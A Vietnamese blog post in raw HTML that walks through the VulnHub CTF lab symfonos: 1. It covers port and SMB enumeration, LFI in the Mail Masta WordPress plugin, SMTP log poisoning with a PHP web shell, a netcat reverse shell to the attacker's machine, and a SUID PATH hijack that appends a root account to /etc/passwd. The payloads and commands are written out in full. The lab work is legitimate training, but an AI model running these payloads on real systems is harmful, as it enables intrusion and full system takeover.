<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution | minhtuanact|Blog - Keep a flame in the rain!</title>
<meta name=keywords content="CyberSecurity,labs,Local File Inclusion"><meta name=description content="Mở đầu Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài Difficulty: Beginner nên build lên làm luôn xem nó có Beginner không :v: Đây là một bài lab khá mới của tác giả Zayotic trong series symfonos. Link bài lab nếu ai muốn khám phá: symfonos: 1 Tấn công Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.f0303af5111aad55971b235f111dec695e462ec8ca93aca0d0e9606df4415eb8.css integrity="sha256-8DA69REarVWXGyNfER3saV5GLsjKk6yg0OlgbfRBXrg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://minhtuanact.github.io/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution"><meta property="og:description" content="Mở đầu Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài Difficulty: Beginner nên build lên làm luôn xem nó có Beginner không :v: Đây là một bài lab khá mới của tác giả Zayotic trong series symfonos. Link bài lab nếu ai muốn khám phá: symfonos: 1 Tấn công Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó."><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.github.io/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-07-11T10:25:07+07:00"><meta property="article:modified_time" content="2019-07-11T10:25:07+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution"><meta name=twitter:description content="Mở đầu Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài Difficulty: Beginner nên build lên làm luôn xem nó có Beginner không :v: Đây là một bài lab khá mới của tác giả Zayotic trong series symfonos. Link bài lab nếu ai muốn khám phá: symfonos: 1 Tấn công Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution","item":"https://minhtuanact.github.io/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution","name":"VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution","description":"Mở đầu Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài Difficulty: Beginner nên build lên làm luôn xem nó có Beginner không :v: Đây là một bài lab khá mới của tác giả Zayotic trong series symfonos. Link bài lab nếu ai muốn khám phá: symfonos: 1 Tấn công Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó.","keywords":["CyberSecurity","labs","Local File Inclusion"],"articleBody":"Mở đầu Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài Difficulty: Beginner nên build lên làm luôn xem nó có Beginner không :v: Đây là một bài lab khá mới của tác giả Zayotic trong series symfonos. Link bài lab nếu ai muốn khám phá: symfonos: 1 Tấn công Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó. Ở đây mình sử dụng arp-scan để quét cho nhanh.\n1 2 3 4 root@kali: arp-scan -l Interface: eth0, datalink type: EN10MB (Ethernet) Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.19.34\t00:0c:29:a0:2f:e9\tVMware, Inc. Web gì thế này, có mỗi cái ảnh là sao, tôi là ai, đây là đâu :scream::scream::scream::scream:\nThử scan tất cả cổng trên này xem sao\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 root@kali:~/Desktop# nmap -p- -A 192.168.19.34 Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-10 14:56 +07 Nmap scan report for symfonos.local (192.168.19.34) Host is up (0.00077s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA) | 256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA) |_ 256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | ssl-cert: Subject: commonName=symfonos | Subject Alternative Name: DNS:symfonos | Not valid before: 2019-06-29T00:29:42 |_Not valid after: 2029-06-26T00:29:42 |_ssl-date: TLS randomness does not represent time 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Site doesn't have a title (text/html). 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP) MAC Address: 00:0C:29:A0:2F:E9 (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: Hosts: symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds Con máy này đang sử dụng dịch vụ mail smtp, có samba kìa, thử vào xem có gì k Có thư mục anonymous, vào mở thì thấy có một tin nhắn của thần Zeus =))\n1 2 3 4 5 Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! Next person I find using one of these passwords will be fired! -Zeus Thử mấy cái epidioko, qwerty với baseball xem thần Zeus có block thật hay không :v:\nThử được thư mục helios có mật khẩu là qwerty thật :joy:\nCó 2 mẩu tin ở đây\nfile research.txt:\n1 Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World. file todo.txt:\n1 2 3 1. Binge watch Dexter 2. Dance 3. Work on /h3l105 Humm, thử vào http://192.168.19.34/h3l105 xem sao. (À quên, add 192.168.19.34 symfonos.local vào /etc/hosts đã)\n1 trang Wordpress\nSử dụng wpscan thì thấy có lỗi như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 root@kali:~# wpscan --url http://symfonos.local/h3l105/ --plugins-detection aggressive [+] mail-masta | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/ | Latest Version: 1.0 (up to date) | Last Updated: 2014-09-19T07:52:00.000Z | Readme: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt | [!] Directory listing is enabled | | Detected By: Known Locations (Aggressive Detection) | | [!] 2 vulnerabilities identified: | | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI) | References: | - https://wpvulndb.com/vulnerabilities/8609 | - https://www.exploit-db.com/exploits/40290/ | - https://cxsecurity.com/issue/WLB-2016080220 | | [!] Title: Mail Masta 1.0 - Multiple SQL Injection | References: | - https://wpvulndb.com/vulnerabilities/8740 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098 | - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin | | Version: 1.0 (100% confidence) | Detected By: Readme - Stable Tag (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt Đọc một hồi về plugin mail-masta thì ở đây có dính Local File Inclusion (LFI)\nhttp://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd Ở file /etc/passwd ta xác định được có những user sau\n1 2 3 4 5 root helios mysql zeus wordpress Check lại bằng smtp-user-enum thì có đúng 3 users này có mail.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 root@kali:~# smtp-user-enum -M VRFY -U users.txt -t 192.168.19.34 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Mode ..................... VRFY Worker Processes ......... 3 Usernames file ........... users.txt Target count ............. 1 Username count ........... 3 Target TCP port .......... 25 Query timeout ............ 3 secs Target domain ............ ######## Scan started at Wed Jul 10 16:07:52 2019 ######### 192.168.19.34: root exists 192.168.19.34: helios exists 192.168.19.34: mysql exists ######## Scan completed at Wed Jul 10 16:07:53 2019 ######### 3 results. Chắc hẳn là phải có thư mục chứa mail, mình có thể đọc được mail người khác gửi đến helios Thử gửi thư với payload cho helios xem sao\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@kali:~# telnet 192.168.19.34 25 Trying 192.168.19.34... Connected to 192.168.19.34. Escape character is '^]'. 220 symfonos.localdomain ESMTP Postfix (Debian/GNU) HELO localhost 250 symfonos.localdomain MAIL FROM: tuan@symfonos.localdomain 250 2.1.0 Ok RCPT TO: helios 250 2.1.5 Ok DATA 354 End data with . \u003c?php system($_GET['c']); ?\u003e Giờ ta sử dụng đường dẫn sau để kiểm tra xem sao:\nview-source:http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios\u0026c=id Ok thành công rồi, chúng ta đã có 1 chú shell =))\nTiếp theo thì ta remote đến nó thôi\nĐầu tiên thì mở nc -lvp 4444 bên máy mình đã\nSử dụng http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios\u0026c=nc%20-e%20/bin/bash%20-nv%20192.168.19.100%204444 để remote ngược về. Ngon, chúng ta đã có máy victim rồi :v:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 helios@symfonos:/home$ find / -perm -u=s 2\u003e/dev/null find / -perm -u=s 2\u003e/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /opt/statuscheck /bin/mount /bin/umount /bin/su /bin/ping helios@symfonos:/home$ Có vẻ như /opt/statuscheck có thể khai thác được, thử run nó lên xem có gì k\n1 2 3 4 5 6 7 8 9 10 11 helios@symfonos:/opt$ ./statuscheck ./statuscheck HTTP/1.1 200 OK Date: Thu, 11 Jul 2019 01:49:50 GMT Server: Apache/2.4.25 (Debian) Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT ETag: \"148-58c6b9bb3bc5b\" Accept-Ranges: bytes Content-Length: 328 Vary: Accept-Encoding Content-Type: text/html Humm, nó chỉ kiểm tra cái trang web có Ok hay k, thử chạy strings /opt/statuscheck thì ra 1 đoạn này\n1 2 3 curl -I H http://lH ocalhostH Dịch ra sẽ là:\n1 curl -I http://localhost Chúng ta cần khám phá được lệnh thực thi này\nCó vài phương thức, nhưng ở trong trường hợp này, dựa trên đầu ra curl ... nó đang thực thi với đường dẫn tương đối của nó, có nghĩa là, với đường dẫn có trong biến môi trường $PATH\n1 2 PATH ABSOLUTE: /usr/bin/curl PATH RELATIVELY: curl Việc của chúng ta bây giờ là phải thay đổi biến $PATH của helios và chuyển hướng của chương trình statuscheck sang một thứ mà ta có thể kiểm soát được. Thay vì chạy trong /usr/bin/curl, ta sẽ điều hướng về để nó thực thi trong /tmp/curl chẳng hạn.\nGiờ chúng ta vào thư mục /tmp rồi tạo 1 file curl, trong file đó có thứ mình muốn để nó chạy lên với quyền root, vì khi chạy /opt/statuscheck, nó sẽ kích hoạt quyền root lên. Và với cái curl giả kia, bạn có thể chạy quyền root với nội dung là bên trong cái file curl vừa tạo.\nỞ đây mình sẽ chọn cách thêm luôn 1 tài khoản root vào hệ thống.\nCấu trúc của file /etc/passwd: username:password_crypt:user_id:group_id:name:home_directory:shell\nVậy giờ mình sẽ tạo 1 file như này : minhtuan:x:0:0:root:/root:/usr/bin/bash với x là mật khẩu được crypt.\nMình sẽ sử dụng perl để crypt password.\n1 2 root@kali:~# perl -e 'print crypt(\"minhtuanact\", \"ahihi\")' ahd.h7gFshGUw Vậy ahd.h7gFshGUw là password crypt, hoàn thiện đoạn thêm user kia sẽ là:\n1 minhtuan:ahd.h7gFshGUw:0:0:root:/root:/usr/bin/bash Giờ sẽ ghi vào file /tmp/curl với nội dung sẽ là\n1 echo minhtuan:ahd.h7gFshGUw:0:0:root:/root:/bin/bash \u003e\u003e /etc/passwd Lệnh này nó sẽ thêm cái tài khoản của mình mới tạo kia vào /etc/passwd. Giờ sẽ phải đánh lừa statuscheck để nó chạy cái thằng curl giả kia lên rồi đăng nhập với tài khoản vừa tạo là xong :v:\nXúc thôi :v:\n1 2 3 4 5 6 helios@symfonos:/tmp$ export PATH=/tmp export PATH=/tmp helios@symfonos:/tmp$ /opt/statuscheck /opt/statuscheck sh: 1: curl: Permission denied helios@symfonos:/tmp$ Ơ Permission denied, à chết quên chưa cấp quyền cho file curl :joy:\n1 2 3 4 5 6 7 8 9 helios@symfonos:/tmp$ export PATH=$PATH_BACKUP export PATH=$PATH_BACKUP helios@symfonos:/tmp$ chmod +x curl chmod +x curl helios@symfonos:/tmp$ export PATH=/tmp export PATH=/tmp helios@symfonos:/tmp$ /opt/statuscheck /opt/statuscheck helios@symfonos:/tmp$ Ok rồi, thử switch sang tài khoản vừa được tạo xem (trước tiên phải chạy export PATH=$PATH_BACKUP trước nhé, không là k có lệnh thực thi đâu)\n1 2 3 4 5 6 helios@symfonos:/tmp$ su minhtuan su minhtuan Password: minhtuanact root@symfonos:/tmp# id id uid=0(root) gid=0(root) groups=0(root) Vậy là ta đã có quyền root rồi. Đọc cờ cuối thôi Tổng kết Bài này ở mức độ Beginner nhưng mình chẳng thấy nó Beginner tý nào lắm :joy::joy: Mong các bạn có thể học hỏi được gì thông qua bài này. Nếu các bạn cảm thấy hay thì cho mình 1 upvote nhé :D ","wordCount":"1655","inLanguage":"en","datePublished":"2019-07-11T10:25:07+07:00","dateModified":"2019-07-11T10:25:07+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class=post-title>VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution</h1><div class=post-meta>&lt;span title='2019-07-11 10:25:07 +0700 +0700'>July 11, 2019&lt;/span>&amp;nbsp;·&amp;nbsp;8 min&amp;nbsp;·&amp;nbsp;minhtuanact</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#m%e1%bb%9f-%c4%91%e1%ba%a7u aria-label="Mở đầu">Mở đầu</a></li><li><a href=#t%e1%ba%a5n-c%c3%b4ng aria-label="Tấn công">Tấn công</a></li><li><a href=#t%e1%bb%95ng-k%e1%ba%bft aria-label="Tổng kết">Tổng kết</a></li></ul></div></details></div><div class=post-content><h2 id=mở-đầu>Mở đầu<a hidden class=anchor aria-hidden=true href=#mở-đầu>#</a></h2><ul><li>Lại là mình đây, vào mấy hôm rảnh rỗi lại mò vào vulhub.com để kiếm mấy bài lab để học hỏi, kiếm được bài <strong>Difficulty: Beginner</strong> nên build lên làm luôn xem nó có <strong>Beginner</strong> không :v:</li><li>Đây là một bài lab khá mới của tác giả <strong>Zayotic</strong> trong series <strong>symfonos</strong>.</li><li>Link bài lab nếu ai muốn khám phá: <a href=https://www.vulnhub.com/entry/symfonos-1,322/>symfonos: 1</a></li></ul><h2 id=tấn-công>Tấn công<a hidden class=anchor aria-hidden=true href=#tấn-công>#</a></h2><ul><li><p>Việc đầu tiên vẫn như thường ngày, build bài lab lên rồi quét địa chỉ ip của nó. Ở đây mình sử dụng <code>arp-scan</code> để quét cho nhanh.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali: arp-scan -l
</span></span><span class=line><span class=cl>Interface: eth0, datalink type: EN10MB <span class=o>(</span>Ethernet<span class=o>)</span>
</span></span><span class=line><span class=cl>Starting arp-scan 1.9.5 with <span class=m>256</span> hosts <span class=o>(</span>https://github.com/royhills/arp-scan<span class=o>)</span>
</span></span><span class=line><span class=cl>192.168.19.34	00:0c:29:a0:2f:e9	VMware, Inc.
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=https://images.viblo.asia/bdc15fcd-b466-4e01-af27-1ad77d0fdce3.png alt></p></li><li><p>Web gì thế này, có mỗi cái ảnh là sao, tôi là ai, đây là đâu :scream::scream::scream::scream:</p></li><li><p>Thử scan tất cả cổng trên này xem sao</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@kali:~/Desktop# nmap -p- -A 192.168.19.34
</span></span><span class=line><span class=cl>Starting Nmap 7.70 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2019-07-10 14:56 +07
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> symfonos.local <span class=o>(</span>192.168.19.34<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00077s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65530</span> closed ports
</span></span><span class=line><span class=cl>PORT    STATE SERVICE     VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>25/tcp  open  smtp        Postfix smtpd
</span></span><span class=line><span class=cl><span class=p>|</span>_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>symfonos
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:symfonos
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2019-06-29T00:29:42
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2029-06-26T00:29:42
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl>80/tcp  open  http        Apache httpd 2.4.25 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.25 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>text/html<span class=o>)</span>.
</span></span><span class=line><span class=cl>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:A0:2F:E9 <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>Device type: general purpose
</span></span><span class=line><span class=cl>Running: Linux 3.X<span class=p>|</span>4.X
</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 4.9
</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
</span></span><span class=line><span class=cl>Service Info: Hosts:  symfonos.localdomain, SYMFONOS<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>TRACEROUTE
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 16.08 seconds
</span></span></code></pre></td></tr></table></div></div></li><li><p>Con máy này đang sử dụng dịch vụ mail smtp, có samba kìa, thử vào xem có gì k
<img loading=lazy src=https://images.viblo.asia/17b6e45f-e1b6-4eb0-bccb-dac0a69084fe.png alt></p></li><li><p>Có thư mục anonymous, vào mở thì thấy có một tin nhắn của thần Zeus =))</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Can users please stop using passwords like &#39;epidioko&#39;, &#39;qwerty&#39; and &#39;baseball&#39;! 
</span></span><span class=line><span class=cl>
